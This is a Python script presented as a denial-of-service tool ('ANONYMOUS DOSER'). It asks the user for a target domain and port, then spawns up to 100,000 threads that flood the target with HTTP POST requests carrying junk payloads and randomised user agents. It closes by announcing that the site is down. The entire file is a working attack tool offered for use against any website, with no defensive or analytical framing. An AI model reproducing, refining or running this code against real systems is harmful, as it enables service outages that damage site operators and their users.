#!/usr/bin/python3
# -*- coding: utf-8 -*-

import socket
import threading
import random
import time
import sys
from colorama import Fore, Style, init
from user_agent import generate_user_agent

init(autoreset=True)

R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN
W = Style.RESET_ALL


print(f"{R}╔{'═'*70}╗")
print(f"║{'ANONYMOUS DOSER V1.0'.center(70)}║")
print(f"║{'!!!666!!!'.center(70)}║")
print(f"╚{'═'*70}╝{W}")


url = input(f"{C}[+] Enter Target Domain >> {W}").strip()
if not url:
    print(f"{R}[!] İnvalid Site Domain!{W}")
    sys.exit()

port = int(input(f"{C}[+] Port 80/443 >> {W}") or 80)
threads = int(input(f"{C}[+] Threads >> {W}") or 100000)
packets = int(input(f"{C}[+] Packets >> {W}") or 10000000)


try:
    host = socket.gethostbyname(url.split('/')[0])
    print(f"{G}[+] IP: {host}:{port}{W}")
except:
    print(f"{R}[!] URL could not be resolved{W}")
    sys.exit()


sent = 0
lock = threading.Lock()
start_time = time.time()


payload = "A" * 2048


def attack():
    global sent
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((host, port))

        packet = (
            f"POST /?kill={random.randint(1000000,9999999)} HTTP/1.1\r\n"
            f"Host: {url}\r\n"
            f"User-Agent: {generate_user_agent()}\r\n"
            f"Connection: close\r\n"
            f"Content-Length: 2048\r\n\r\n"
            f"{payload}"
        ).encode()

        for _ in range(100):
            s.sendall(packet)
        s.close()

        with lock:
            sent += 100

    except:
        pass

# === START ===
print(f"{G}[+] Attack Started!{W}")
for _ in range(threads):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

# === MONITOR ===
while sent < packets:
    elapsed = time.time() - start_time
    speed = int(sent / elapsed) if elapsed > 0 else 0
    print(f"{G}[{sent:,}/{packets:,}] → {speed:,}/s {W}", end='\r')
    time.sleep(0.01)

# === SONUÇ ===
total_time = time.time() - start_time
print(f"\n{G}DDOS COMPLETED → {sent:,} PACKET → {total_time:.2f}s{W}")
print(f"{R}TARGET: {url} SERVER SUCCESSFULLY DOWN!{W}")
print(f"{Y}!!!SİTE İS DEAD!!!{W}")
